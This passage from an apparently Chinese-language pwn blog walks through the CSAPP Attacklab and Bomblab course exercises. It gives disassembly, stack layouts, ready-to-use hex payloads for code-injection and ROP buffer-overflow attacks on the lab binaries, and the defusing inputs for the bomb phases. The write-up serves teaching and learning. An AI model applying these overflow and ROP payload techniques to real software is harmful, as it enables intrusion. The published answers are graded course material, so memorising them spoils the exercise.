00 00 00 00 00 00 00 00 00 00 C0 17 40 00 00 00 00 00 ","date":"2021-02-02","objectID":"/csapp-attacklab/:1:0","series":null,"tags":["Pwn"],"title":"CSAPP Attacklab","uri":"/csapp-attacklab/#phase_1"},{"categories":["Pwning"],"content":"phase_2 00000000004017ec \u003ctouch2\u003e: 4017ec: 48 83 ec 08 sub $0x8,%rsp 4017f0: 89 fa mov %edi,%edx 4017f2: c7 05 e0 2c 20 00 02 movl $0x2,0x202ce0(%rip) # 6044dc \u003cvlevel\u003e 4017f9: 00 00 00 4017fc: 3b 3d e2 2c 20 00 cmp 0x202ce2(%rip),%edi # 6044e4 \u003ccookie\u003e 401802: 75 20 jne 401824 \u003ctouch2+0x38\u003e 401804: be e8 30 40 00 mov $0x4030e8,%esi 401809: bf 01 00 00 00 mov $0x1,%edi 40180e: b8 00 00 00 00 mov $0x0,%eax 401813: e8 d8 f5 ff ff callq 400df0 \u003c__printf_chk@plt\u003e 401818: bf 02 00 00 00 mov $0x2,%edi 40181d: e8 6b 04 00 00 callq 401c8d \u003cvalidate\u003e 401822: eb 1e jmp 401842 \u003ctouch2+0x56\u003e 401824: be 10 31 40 00 mov $0x403110,%esi 401829: bf 01 00 00 00 mov $0x1,%edi 40182e: b8 00 00 00 00 mov $0x0,%eax 401833: e8 b8 f5 ff ff callq 400df0 \u003c__printf_chk@plt\u003e 401838: bf 02 00 00 00 mov $0x2,%edi 40183d: e8 0d 05 00 00 callq 401d4f \u003cfail\u003e 401842: bf 00 00 00 00 mov $0x0,%edi 401847: e8 f4 f5 ff ff callq 400e40 \u003cexit@plt\u003e 我们的任务是重新调用touch2，输入函数依然是getbuf。touch2函数中有一个参数且这个参数必须等于cookie值。所以我们在调用touch2之前要先将cookie放入rdi。将我们注入的代码写到栈上，然后调用设置rdi，最后返回touch2。 所以注入代码为：mov 0x59b997fa,rdi;ret; ，栈布局： |mov 0x59b997fa,rdi | |ret touch2 | |padding | |shellcode_addr | 查看getbuf处的rsp： pwndbg\u003e info r rsp rsp 0x5561dc78 0x5561dc78 这里的rsp其实是Gets栈底，所以答案为： 48 c7 c7 fa 97 b9 59 68 ec 17 40 00 c3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 dc 61 55 00 00 00 00 niebelungen@ubuntu:~/Desktop/target1$ ./hex2raw \u003c test.txt | ./ctarget -q Cookie: 0x59b997fa Type string:Touch2!: You called touch2(0x59b997fa) Valid solution for level 2 with target ctarget PASS: Would have posted the following: user id bovik course 15213-f15 lab attacklab result 1:PASS:0xffffffff:ctarget:2:48 C7 C7 FA 97 B9 59 68 EC 17 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00 ","date":"2021-02-02","objectID":"/csapp-attacklab/:2:0","series":null,"tags":["Pwn"],"title":"CSAPP Attacklab","uri":"/csapp-attacklab/#phase_2"},{"categories":["Pwning"],"content":"phase_3 void touch3(char *sval){ vlevel=3; if(hexmatch(cookie,sval)){ printf(\"Touch3!: You called touch3(\\\"%s\\\")\\n\",sval); validate(3); }else{ printf(\"Misfire: You called touch3(\\\"%s\\\")\\n\",sval); fail(3); } exit(0); } int hexmatch(unsigned val,char *sval){ char cbuf[110]; char *s = cbuf+random()%100; sprintf(s,\"%.8x\",val); return strncmp(sval,s,9) == 0; } 这里我们需要调用touch3，需要将存放cookie字符串的地址作为参数。我们将字符串写在栈上，然后将地址放入rdi，然后调用touch3。cookie转为ASCII字符： pwndbg\u003e print /x \"59b997fa\" $1 = {0x35, 0x39, 0x62, 0x39, 0x39, 0x37, 0x66, 0x61, 0x0} 栈的结构： |mov cookie_addr,rdi| |ret touch3 | |padding | |shellcode_addr | |cookie | 答案： 48 c7 c7 a8 dc 61 55 68 fa 18 40 00 c3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 dc 61 55 00 00 00 00 35 39 62 39 39 37 66 61 niebelungen@ubuntu:~/Desktop/target1$ ./hex2raw \u003c test.txt | ./ctarget -q Cookie: 0x59b997fa Type string:Touch3!: You called touch3(\"59b997fa\") Valid solution for level 3 with target ctarget PASS: Would have posted the following: user id bovik course 15213-f15 lab attacklab result 1:PASS:0xffffffff:ctarget:3:48 C7 C7 A8 DC 61 55 68 FA 18 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00 35 39 62 39 39 37 66 61 ","date":"2021-02-02","objectID":"/csapp-attacklab/:3:0","series":null,"tags":["Pwn"],"title":"CSAPP Attacklab","uri":"/csapp-attacklab/#phase_3"},{"categories":["Pwning"],"content":"ROP-Level2使用gadget完成level2。gadget限定了范围：0x401994-0x401ab2 00000000004019c3 \u003csetval_426\u003e: 4019c3: c7 07 48 89 c7 90 movl $0x90c78948,(%rdi) 4019c9: c3 retq 00000000004019a7 \u003caddval_219\u003e: 4019a7: 8d 87 51 73 58 90 lea -0x6fa78caf(%rdi),%eax 4019ad: c3 这里89 c7 90 c3==\u003emov rdi,rax;nop;ret，下面的58 90 c3==\u003epop rax;nop;ret 这两个gadget可以让我们控制rdi的值。 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ab 19 40 00 00 00 00 00 /*pop rax ; nop ; ret*/ fa 97 b9 59 00 00 00 00 /*cookie*/ c5 19 40 00 00 00 00 00 /*mov rdi, rax ; nop ;ret*/ ec 17 40 00 00 00 00 00 /*touch2*/ niebelungen@ubuntu:~/Desktop/target1$ ./hex2raw \u003c test.txt | ./rtarget -q Cookie: 0x59b997fa Type string:Touch2!: You called touch2(0x59b997fa) Valid solution for level 2 with target rtarget PASS: Would have posted the following: user id bovik course 15213-f15 lab attacklab result 1:PASS:0xffffffff:rtarget:2:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 AB 19 40 00 00 00 00 00 FA 97 B9 59 00 00 00 00 C5 19 40 00 00 00 00 00 EC 17 40 00 00 00 00 00 ","date":"2021-02-02","objectID":"/csapp-attacklab/:4:0","series":null,"tags":["Pwn"],"title":"CSAPP Attacklab","uri":"/csapp-attacklab/#rop-level2"},{"categories":["Pwning"],"content":"ROP-Level3使用gadget完成level3。 我们要想办法将字符串地址传入rdi中。但是在rtarget中，栈地址随机化。所以我们无法想之前那样直接传入栈地址。那么我们需要取得rsp的值。并可以对它做计算 0x0000000000401a06 : mov rax, rsp ; ret 0x00000000004019a2 : mov rdi, rax ; ret 0x00000000004019ab : pop rax ; nop ; ret 0x00000000004019d6 : lea rax, [rdi + rsi] ; ret 0x0000000000401a13 : mov esi, ecx ; nop ; nop ; ret 0x0000000000401a69 : mov ecx, edx ; or bl, bl ; ret 0x00000000004019dd : mov edx, eax ; nop ; ret mov rax, rsp ; ret; mov rdi, rax ; ret，取得rsp,并将其存入rdi。 pop rax ; nop ; ret控制rax的值。 mov edx, eax ; nop ; ret ; mov ecx, edx ; or bl, bl ; ret ; mov esi, ecx ; nop ; nop ; ret，控制了rsi的值。 lea rax, [rdi + rsi] ; ret ; mov rdi, rax ; ret，将rdi中的值加上rsi中的偏移，又放入rdi。 |padding | |0x0000000000401a06 | |0x00000000004019a2 | |0x00000000004019ab | |offset | |0x00000000004019dd | |0x0000000000401a69 | |0x0000000000401a13 | |0x00000000004019d6 | |0x00000000004019a2 | |touch3 | |cookie | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 06 1a 40 00 00 00 00 00 a2 19 40 00 00 00 00 00 ab 19 40 00 00 00 00 00 48 00 00 00 00 00 00 00 dd 19 40 00 00 00 00 00 69 1a 40 00 00 00 00 00 13 1a 40 00 00 00 00 00 d6 19 40 00 00 00 00 00 a2 19 40 00 00 00 00 00 fa 18 40 00 00 00 00 00 35 39 62 39 39 37 66 61 niebelungen@ubuntu:~/Desktop/target1$ ./hex2raw \u003c test.txt | ./rtarget -q Cookie: 0x59b997fa Type string:Touch3!: You called touch3(\"59b997fa\") Valid solution for level 3 with target rtarget PASS: Would have posted the following: user id bovik course 15213-f15 lab attacklab result 1:PASS:0xffffffff:rtarget:3:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 06 1A 40 00 00 00 00 00 A2 19 40 00 00 00 00 00 AB 19 40 00 00 00 00 00 48 00 00 00 00 00 00 00 DD 19 40 00 00 00 00 00 69 1A 40 00 00 00 00 00 13 1A 40 00 00 00 00 00 D6 19 40 00 00 00 00 00 A2 19 40 00 00 00 00 00 FA 18 40 00 00 00 00 00 35 39 62 39 39 37 66 61 ","date":"2021-02-02","objectID":"/csapp-attacklab/:5:0","series":null,"tags":["Pwn"],"title":"CSAPP Attacklab","uri":"/csapp-attacklab/#rop-level3"},{"categories":["Pwning"],"content":"CSAPP-Bmoblab输入正确的字符串拆除六个炸弹，通过分析汇编代码+调试找出答案。意外地很好玩~~ ","date":"2021-01-31","objectID":"/csapp-bomblab/:0:0","series":null,"tags":["Pwn"],"title":"CSAPP Bomblab","uri":"/csapp-bomblab/#csapp-bmoblab"},{"categories":["Pwning"],"content":"phase_1 0000000000400ee0 \u003cphase_1\u003e: 400ee0: 48 83 ec 08 sub $0x8,%rsp 400ee4: be 00 24 40 00 mov $0x402400,%esi 400ee9: e8 4a 04 00 00 callq 401338 \u003cstrings_not_equal\u003e 400eee: 85 c0 test %eax,%eax 400ef0: 74 05 je 400ef7 \u003cphase_1+0x17\u003e 400ef2: e8 43 05 00 00 callq 40143a \u003cexplode_bomb\u003e 400ef7: 48 83 c4 08 add $0x8,%rsp 400efb: c3 retq read_line的输入被当作第一个参数传入了phase_1，随后0x4020400作为第二个参数，进入了strings_not_equal，test eax,eax比较返回值，不相等就会explode_bomb。所以我们要输入的字符串就在0x402400处。 pwndbg\u003e print (char *) 0x402400 $1 = 0x402400 \"Border relations with Canada have never been better.\" ","date":"2021-01-31","objectID":"/csapp-bomblab/:1:0","series":null,"tags":["Pwn"],"title":"CSAPP Bomblab","uri":"/csapp-bomblab/#phase_1"},{"categories":["Pwning"],"content":"phase_2同样输入被当作第一个参数。 0000000000400efc \u003cphase_2\u003e: 400efc: 55 push %rbp 400efd: 53 push %rbx 400efe: 48 83 ec 28 sub $0x28,%rsp 400f02: 48 89 e6 mov %rsp,%rsi 400f05: e8 52 05 00 00 callq 40145c \u003cread_six_numbers\u003e 400f0a: 83 3c 24 01 cmpl $0x1,(%rsp) 400f0e: 74 20 je 400f30 \u003cphase_2+0x34\u003e 400f10: e8 25 05 00 00 callq 40143a \u003cexplode_bomb\u003e 400f15: eb 19 jmp 400f30 \u003cphase_2+0x34\u003e 400f17: 8b 43 fc mov -0x4(%rbx),%eax 400f1a: 01 c0 add %eax,%eax 400f1c: 39 03 cmp %eax,(%rbx) 400f1e: 74 05 je 400f25 \u003cphase_2+0x29\u003e 400f20: e8 15 05 00 00 callq 40143a \u003cexplode_bomb\u003e 400f25: 48 83 c3 04 add $0x4,%rbx 400f29: 48 39 eb cmp %rbp,%rbx 400f2c: 75 e9 jne 400f17 \u003cphase_2+0x1b\u003e 400f2e: eb 0c jmp 400f3c \u003cphase_2+0x40\u003e 400f30: 48 8d 5c 24 04 lea 0x4(%rsp),%rbx 400f35: 48 8d 6c 24 18 lea 0x18(%rsp),%rbp 400f3a: eb db jmp 400f17 \u003cphase_2+0x1b\u003e 400f3c: 48 83 c4 28 add $0x28,%rsp 400f40: 5b pop %rbx 400f41: 5d pop %rbp 400f42: c3 retq 将栈增长，传入rsi。 000000000040145c \u003cread_six_numbers\u003e: 40145c: 48 83 ec 18 sub $0x18,%rsp 401460: 48 89 f2 mov %rsi,%rdx 401463: 48 8d 4e 04 lea 0x4(%rsi),%rcx 401467: 48 8d 46 14 lea 0x14(%rsi),%rax 40146b: 48 89 44 24 08 mov %rax,0x8(%rsp) 401470: 48 8d 46 10 lea 0x10(%rsi),%rax 401474: 48 89 04 24 mov %rax,(%rsp) 401478: 4c 8d 4e 0c lea 0xc(%rsi),%r9 40147c: 4c 8d 46 08 lea 0x8(%rsi),%r8 401480: be c3 25 40 00 mov $0x4025c3,%esi 401485: b8 00 00 00 00 mov $0x0,%eax 40148a: e8 61 f7 ff ff callq 400bf0 \u003c__isoc99_sscanf@plt\u003e 40148f: 83 f8 05 cmp $0x5,%eax 401492: 7f 05 jg 401499 \u003cread_six_numbers+0x3d\u003e 401494: e8 a1 ff ff ff callq 40143a \u003cexplode_bomb\u003e 401499: 48 83 c4 18 add $0x18,%rsp 40149d: c3 retq 这里又将栈增长，将rsi即原来的栈顶地址作为第三个参数给了rdx，偏移+4作为第四个参数给了rcx，同理，第五个参数在r8，第六个参数在r9。如果寄存器不够传参，会将参数入栈。分析第5-8行，偏移+0x10的第七个参数，和+0x14的第八个参数入栈了。 之后调用了sscanf：int sscanf(const char *str, const char *format, ...)，第一个参数是我们的输入，即数据源。第二个参数是0x4025c3处的格式化字符串。sscanf是将数据源按照格式化字符串的格式，给后面的参数赋值。查看格式化字符串： pwndbg\u003e print (char *) 0x4025c3 $1 = 0x4025c3 \"%d %d %d %d %d %d\" 所以我们就是要输入六个数字，中间以空格分隔。最后清栈返回。 400f0a: 83 3c 24 01 cmpl $0x1,(%rsp) 400f0e: 74 20 je 400f30 \u003cphase_2+0x34\u003e 400f10: e8 25 05 00 00 callq 40143a \u003cexplode_bomb\u003e 这时rsp指向了第一个参数，cmpl $0x1,(%rsp)与1进行比较，相等则跳转： 400f30: 48 8d 5c 24 04 lea 0x4(%rsp),%rbx 400f35: 48 8d 6c 24 18 lea 0x18(%rsp),%rbp 400f3a: eb db jmp 400f17 \u003cphase_2+0x1b\u003e rsp上移4的地址，给了rbx，这时rbx指向第二个参数。rsp上移0x18的地址，给了rbp，这时rbp指向了最后一个参数的后面的地址。最后跳回： 400f17: 8b 43 fc mov -0x4(%rbx),%eax 400f1a: 01 c0 add %eax,%eax 400f1c: 39 03 cmp %eax,(%rbx) 400f1e: 74 05 je 400f25 \u003cphase_2+0x29\u003e 400f20: e8 15 05 00 00 callq 40143a \u003cexplode_bomb\u003e 400f25: 48 83 c3 04 add $0x4,%rbx 400f29: 48 39 eb cmp %rbp,%rbx 400f2c: 75 e9 jne 400f17 \u003cphase_2+0x1b\u003e 400f2e: eb 0c jmp 400f3c \u003cphase_2+0x40\u003e 第一个参数*2与第二个参数比较，不相等就爆炸，相等就会跳到第6行的位置。将rbx地址+4，并与rbp进行比较。这里rbx就又指向了第三个参数，然后跳回，重复上面的操作，知道比较完了所有的参数，rbp==rbx。所以，除了第一个参数为1，其余参数都是前面参数的二倍。则结果为： 1 2 4 8 16 32 ","date":"2021-01-31","objectID":"/csapp-bomblab/:2:0","series":null,"tags":["Pwn"],"title":"CSAPP Bomblab","uri":"/csapp-bomblab/#phase_2"},{"categories":["Pwning"],"content":"phase_3 0000000000400f43 \u003cphase_3\u003e: 400f43: 48 83 ec 18 sub $0x18,%rsp 400f47: 48 8d 4c 24 0c lea 0xc(%rsp),%rcx 400f4c: 48 8d 54 24 08 lea 0x8(%rsp),%rdx 400f51: be cf 25 40 00 mov $0x4025cf,%esi 400f56: b8 00 00 00 00 mov $0x0,%eax 400f5b: e8 90 fc ff ff callq 400bf0 \u003c__isoc99_sscanf@plt\u003e 400f60: 83 f8 01 cmp $0x1,%eax 400f63: 7f 05 jg 400f6a \u003cphase_3+0x27\u003e 400f65: e8 d0 04 00 00 callq 40143a \u003cexplode_bomb\u003e 400f6a: 83 7c 24 08 07 cmpl $0x7,0x8(%rsp) 400f6f: 77 3c ja 400fad \u003cphase_3+0x6a\u003e 400f71: 8b 44 24 08 mov 0x8(%rsp),%eax 400f75: ff 24 c5 70 24 40 00 jmpq *0x402470(,%rax,8) 400f7c: b8 cf 00 00 00 mov $0xcf,%eax 400f81: eb 3b jmp 400fbe \u003cphase_3+0x7b\u003e 400f83: b8 c3 02 00 00 mov $0x2c3,%eax 400f88: eb 34 jmp 400fbe \u003cphase_3+0x7b\u003e 400f8a: b8 00 01 00 00 mov $0x100,%eax 400f8f: eb 2d jmp 400fbe \u003cphase_3+0x7b\u003e 400f91: b8 85 01 00 00 mov $0x185,%eax 400f96: eb 26 jmp 400fbe \u003cphase_3+0x7b\u003e 400f98: b8 ce 00 00 00 mov $0xce,%eax 400f9d: eb 1f jmp 400fbe \u003cphase_3+0x7b\u003e 400f9f: b8 aa 02 00 00 mov $0x2aa,%eax 400fa4: eb 18 jmp 400fbe \u003cphase_3+0x7b\u003e 400fa6: b8 47 01 00 00 mov $0x147,%eax 400fab: eb 11 jmp 400fbe \u003cphase_3+0x7b\u003e 400fad: e8 88 04 00 00 callq 40143a \u003cexplode_bomb\u003e 400fb2: b8 00 00 00 00 mov $0x0,%eax 400fb7: eb 05 jmp 400fbe \u003cphase_3+0x7b\u003e 400fb9: b8 37 01 00 00 mov $0x137,%eax 400fbe: 3b 44 24 0c cmp 0xc(%rsp),%eax 400fc2: 74 05 je 400fc9 \u003cphase_3+0x86\u003e 400fc4: e8 71 04 00 00 callq 40143a \u003cexplode_bomb\u003e 400fc9: 48 83 c4 18 add $0x18,%rsp 400fcd: c3 retq 这里同样调用了sscanf，查看格式化字符串： pwndbg\u003e print (char *) 0x4025cf $1 = 0x4025cf \"%d %d\" 最后输入的第一个参数放入了rsp+8，第二个参数放入rsp+0xc。返回后eax与1进行比较，判断是否输入了两个数，否则爆炸。然后第一个参数与7比较，判断第一个参数是否超过了7，否则爆炸。 之后将第一个参数放入eax，并跳转到0x402470+8*rax处。我们看看0x402470有存放的地址是什么： pwndbg\u003e x/16x 0x402470 0x402470: 0x00400f7c 0x00000000 0x00400fb9 0x00000000 0x402480: 0x00400f83 0x00000000 0x00400f8a 0x00000000 0x402490: 0x00400f91 0x00000000 0x00400f98 0x00000000 0x4024a0: 0x00400f9f 0x00000000 0x00400fa6 0x00000000 每个地址都对应了mov $xxx,%eax，即根据第一个参数跳转到不同的地址，给eax赋值，最后到0x400be比较第二个参数与eax。所以只要输入的第一个参数与第二个参数是对应的就可以。答案以下其一： 0 207 1 311 2 707 3 256 4 389 5 206 6 682 7 327 ","date":"2021-01-31","objectID":"/csapp-bomblab/:3:0","series":null,"tags":["Pwn"],"title":"CSAPP Bomblab","uri":"/csapp-bomblab/#phase_3"},{"categories":["Pwning"],"content":"phase_4 000000000040100c \u003cphase_4\u003e: 40100c: 48 83 ec 18 sub $0x18,%rsp 401010: 48 8d 4c 24 0c lea 0xc(%rsp),%rcx 401015: 48 8d 54 24 08 lea 0x8(%rsp),%rdx 40101a: be cf 25 40 00 mov $0x4025cf,%esi 40101f: b8 00 00 00 00 mov $0x0,%eax 401024: e8 c7 fb ff ff callq 400bf0 \u003c__isoc99_sscanf@plt\u003e 401029: 83 f8 02 cmp $0x2,%eax 40102c: 75 07 jne 401035 \u003cphase_4+0x29\u003e 40102e: 83 7c 24 08 0e cmpl $0xe,0x8(%rsp) 401033: 76 05 jbe 40103a \u003cphase_4+0x2e\u003e 401035: e8 00 04 00 00 callq 40143a \u003cexplode_bomb\u003e 40103a: ba 0e 00 00 00 mov $0xe,%edx 40103f: be 00 00 00 00 mov $0x0,%esi 401044: 8b 7c 24 08 mov 0x8(%rsp),%edi 401048: e8 81 ff ff ff callq 400fce \u003cfunc4\u003e 40104d: 85 c0 test %eax,%eax 40104f: 75 07 jne 401058 \u003cphase_4+0x4c\u003e 401051: 83 7c 24 0c 00 cmpl $0x0,0xc(%rsp) 401056: 74 05 je 40105d \u003cphase_4+0x51\u003e 401058: e8 dd 03 00 00 callq 40143a \u003cexplode_bomb\u003e 40105d: 48 83 c4 18 add $0x18,%rsp 401061: c3 retq 又一个sscanf，跟第三关格式化字符串的地址一样。 返回后比较eax与2，判断参数是否输入了两个，否则跳转到炸弹处。然后判断第一个参数是否小于等于14，否则爆炸。之后调用func4,第一个参数为我们输入的第一个参数，第二个参数为0，第三个为14。 0000000000400fce \u003cfunc4\u003e: 400fce: 48 83 ec 08 sub $0x8,%rsp 400fd2: 89 d0 mov %edx,%eax 400fd4: 29 f0 sub %esi,%eax 400fd6: 89 c1 mov %eax,%ecx 400fd8: c1 e9 1f shr $0x1f,%ecx 400fdb: 01 c8 add %ecx,%eax 400fdd: d1 f8 sar %eax 400fdf: 8d 0c 30 lea (%rax,%rsi,1),%ecx 400fe2: 39 f9 cmp %edi,%ecx 400fe4: 7e 0c jle 400ff2 \u003cfunc4+0x24\u003e 400fe6: 8d 51 ff lea -0x1(%rcx),%edx 400fe9: e8 e0 ff ff ff callq 400fce \u003cfunc4\u003e 400fee: 01 c0 add %eax,%eax 400ff0: eb 15 jmp 401007 \u003cfunc4+0x39\u003e 400ff2: b8 00 00 00 00 mov $0x0,%eax 400ff7: 39 f9 cmp %edi,%ecx 400ff9: 7d 0c jge 401007 \u003cfunc4+0x39\u003e 400ffb: 8d 71 01 lea 0x1(%rcx),%esi 400ffe: e8 cb ff ff ff callq 400fce \u003cfunc4\u003e 401003: 8d 44 00 01 lea 0x1(%rax,%rax,1),%eax 401007: 48 83 c4 08 add $0x8,%rsp 40100b: c3 retq 第三个参数放入eax后减去第二个参数，最后放入了ecx。然后逻辑左移31位，再加上原来的数，最后算术右移一位，放入eax。然后ecx=rax+rsi，假设func4(int a,int b,int c)，那么上述指令相当于(c-b)/2+b。本题来说就是7。 也就是7被放入了ecx。然后比较第一个参数a与7的大小，判断是否7小于等于a。 若是，eax被赋值为0，再次比较a与7，这里这两个参数都没有改变所以必然会跳转，最后退出，返回值为0。 从这个分支继续分析，返回之后test eax,eax，因为eax=0，所以ZF=1，不会跳转，然后比较我们输入的第二个参数与0，相等就会退出，否则爆炸。 所以7 0是一个答案。 若否，7-1被赋值给了edx，再次调用了func4。 经过上面的分析只要让func4最后的返回值为0就可以。所以我们分析一下，若a\u003c7时，输入何值才能使条件成立。 (c-b)/2+b-1，即6作为第三个参数，其余参数没有发生变化。此时6/2=3，即a=3，使条件成立。第二层返回到第一层，0*2=0，返回，条件成立。 否则，继续调用，此时3-1=2作为第三个参数。2/2=1，a=1，条件成立。 否则，a=0，条件成立。 答案为以下其一： 7 0 3 0 1 0 0 0 ","date":"2021-01-31","objectID":"/csapp-bomblab/:4:0","series":null,"tags":["Pwn"],"title":"CSAPP Bomblab","uri":"/csapp-bomblab/#phase_4"},{"categories":["Pwning"],"content":"phase_5 0000000000401062 \u003cphase_5\u003e: 401062: 53 push %rbx 401063: 48 83 ec 20 sub $0x20,%rsp 401067: 48 89 fb mov %rdi,%rbx 40106a: 64 48 8b 04 25 28 00 mov %fs:0x28,%rax 401071: 00 00 401073: 48 89 44 24 18 mov %rax,0x18(%rsp) 401078: 31 c0 xor %eax,%eax 40107a: e8 9c 02 00 00 callq 40131b \u003cstring_length\u003e 40107f: 83 f8 06 cmp $0x6,%eax 401082: 74 4e je 4010d2 \u003cphase_5+0x70\u003e 401084: e8 b1 03 00 00 callq 40143a \u003cexplode_bomb\u003e 401089: eb 47 jmp 4010d2 \u003cphase_5+0x70\u003e 40108b: 0f b6 0c 03 movzbl (%rbx,%rax,1),%ecx 40108f: 88 0c 24 mov %cl,(%rsp) 401092: 48 8b 14 24 mov (%rsp),%rdx 401096: 83 e2 0f and $0xf,%edx 401099: 0f b6 92 b0 24 40 00 movzbl 0x4024b0(%rdx),%edx 4010a0: 88 54 04 10 mov %dl,0x10(%rsp,%rax,1) 4010a4: 48 83 c0 01 add $0x1,%rax 4010a8: 48 83 f8 06 cmp $0x6,%rax 4010ac: 75 dd jne 40108b \u003cphase_5+0x29\u003e 4010ae: c6 44 24 16 00 movb $0x0,0x16(%rsp) 4010b3: be 5e 24 40 00 mov $0x40245e,%esi 4010b8: 48 8d 7c 24 10 lea 0x10(%rsp),%rdi 4010bd: e8 76 02 00 00 callq 401338 \u003cstrings_not_equal\u003e 4010c2: 85 c0 test %eax,%eax 4010c4: 74 13 je 4010d9 \u003cphase_5+0x77\u003e 4010c6: e8 6f 03 00 00 callq 40143a \u003cexplode_bomb\u003e 4010cb: 0f 1f 44 00 00 nopl 0x0(%rax,%rax,1) 4010d0: eb 07 jmp 4010d9 \u003cphase_5+0x77\u003e 4010d2: b8 00 00 00 00 mov $0x0,%eax 4010d7: eb b2 jmp 40108b \u003cphase_5+0x29\u003e 4010d9: 48 8b 44 24 18 mov 0x18(%rsp),%rax 4010de: 64 48 33 04 25 28 00 xor %fs:0x28,%rax 4010e5: 00 00 4010e7: 74 05 je 4010ee \u003cphase_5+0x8c\u003e 4010e9: e8 42 fa ff ff callq 400b30 \u003c__stack_chk_fail@plt\u003e 4010ee: 48 83 c4 20 add $0x20,%rsp 4010f2: 5b pop %rbx 4010f3: c3 retq 竟然有canary~ rbx保存入栈，栈增长0x20，输入的字符串存入rbx，放canary，eax清零，调用string_length。最后返回字符串的长度，并与6进行比较，不相等就爆炸。所以要输入一个长度为6的字符串。 然后将eax赋值为0，然后字符串的最低字节放入ecx中，然后入栈，最后放入rdx，再与上0xf。最后取低四位放入了edx。 之后将这低四位加上0x4024b0的和的最低字节，放入edx,最后又将其放入栈中，canary之下。rax+1，与6进行比较，不相等就重复上面的操作。直到向栈中放入了6个字符，最后用’\\x00‘进行截断。 然后调用strings_not_equal比较存入字符串，与0x40245e处的字符串。相等则退出，不相等就爆炸。查看0x40245e处的字符串： pwndbg\u003e x /s 0x40245e 0x40245e: \"flyers\" 查看0x4024b0处字符串： pwndbg\u003e x /s 0x4024b0 0x4024b0 \u003carray.3449\u003e: \"maduiersnfotvbylSo you think you can stop the bomb with ctrl-c, do you?\" 这里其实只要maduiersnfotvby，因为四位二进制数的范围为0-15。计算一下6个偏移： 9 f e 5 6 7 所以只要低四位对应上面这些都可以，参考答案： ionefg/IONEFG ","date":"2021-01-31","objectID":"/csapp-bomblab/:5:0","series":null,"tags":["Pwn"],"title":"CSAPP Bomblab","uri":"/csapp-bomblab/#phase_5"},{"categories":["Pwning"],"content":"phase_6 00000000004010f4 \u003cphase_6\u003e: 4010f4: 41 56 push %r14 4010f6: 41 55 push %r13 4010f8: 41 54 push %r12 4010fa: 55 push %rbp 4010fb: 53 push %rbx 4010fc: 48 83 ec 50 sub $0x50,%rsp 401100: 49 89 e5 mov %rsp,%r13 401103: 48 89 e6 mov %rsp,%rsi 401106: e8 51 03 00 00 callq 40145c \u003cread_six_numbers\u003e 调用了read_six_numbers，根据之前的分析我们要输入六个数字。 40110b: 49 89 e6 mov %rsp,%r14 40110e: 41 bc 00 00 00 00 mov $0x0,%r12d 401114: 4c 89 ed mov %r13,%rbp 401117: 41 8b 45 00 mov 0x0(%r13),%eax 40111b: 83 e8 01 sub $0x1,%eax 40111e: 83 f8 05 cmp $0x5,%eax 401121: 76 05 jbe 401128 \u003cphase_6+0x34\u003e ;0x401128 401123: e8 12 03 00 00 callq 40143a \u003cexplode_bomb\u003e 401128: 41 83 c4 01 add $0x1,%r12d 40112c: 41 83 fc 06 cmp $0x6,%r12d 401130: 74 21 je 401153 \u003cphase_6+0x5f\u003e ;0x401153 401132: 44 89 e3 mov %r12d,%ebx 401135: 48 63 c3 movslq %ebx,%rax 401138: 8b 04 84 mov (%rsp,%rax,4),%eax 40113b: 39 45 00 cmp %eax,0x0(%rbp) 40113e: 75 05 jne 401145 \u003cphase_6+0x51\u003e ;0x401145 401140: e8 f5 02 00 00 callq 40143a \u003cexplode_bomb\u003e 401145: 83 c3 01 add $0x1,%ebx 401148: 83 fb 05 cmp $0x5,%ebx 40114b: 7e e8 jle 401135 \u003cphase_6+0x41\u003e ;0x401135 40114d: 49 83 c5 04 add $0x4,%r13 401151: eb c1 jmp 401114 \u003cphase_6+0x20\u003e ;0x401114 这里r13指向了我们输入的数字。第一个数字-1与5进行比较，大于5就爆炸，所以我们输入的第一个数要小于等于6。 然后r12d+1，与6进行比较，第一次比较r12d为0。无论怎样，我们先考虑不相等的情况。 将r12d当作索引放入了rax，之后比较rsp+4*rax与rbp，即第一个参数与第二个参数，相等就会爆炸。然后，判断ebx即原来的r12d中的值+1后是否小于等于5。 如果小于就会跳回，ebx放入rax作为索引。这里ebx已经被加了1。所以可以分析出这是一个for循环用来判断，第一个数与之后的数是否相等。 之后r13+4指向了我们的第二个数，然后又比较了第二个数与6的大小。然后，把第二个参数单作第一个数，进行上述操作。 所以，通过上面的分析，我们输入的六个数要小于等于6，且两两不相等。 401153: 48 8d 74 24 18 lea 0x18(%rsp),%rsi 401158: 4c 89 f0 mov %r14,%rax 40115b: b9 07 00 00 00 mov $0x7,%ecx 401160: 89 ca mov %ecx,%edx 401162: 2b 10 sub (%rax),%edx 401164: 89 10 mov %edx,(%rax) 401166: 48 83 c0 04 add $0x4,%rax 40116a: 48 39 f0 cmp %rsi,%rax 40116d: 75 f1 jne 401160 \u003cphase_6+0x6c\u003e ;0x401160 lea 0x18(%rsp),%rsi将数组末尾地址给了rsi。将r14中的数组首址放入rax中，最后实现：7-参数。然后判断，是否到了数组尾部。所以这段实现了7-num[i]。 40116f: be 00 00 00 00 mov $0x0,%esi 401174: eb 21 jmp 401197 \u003cphase_6+0xa3\u003e ;0x401197 401176: 48 8b 52 08 mov 0x8(%rdx),%rdx 40117a: 83 c0 01 add $0x1,%eax 40117d: 39 c8 cmp %ecx,%eax 40117f: 75 f5 jne 401176 \u003cphase_6+0x82\u003e ;0x401176 401181: eb 05 jmp 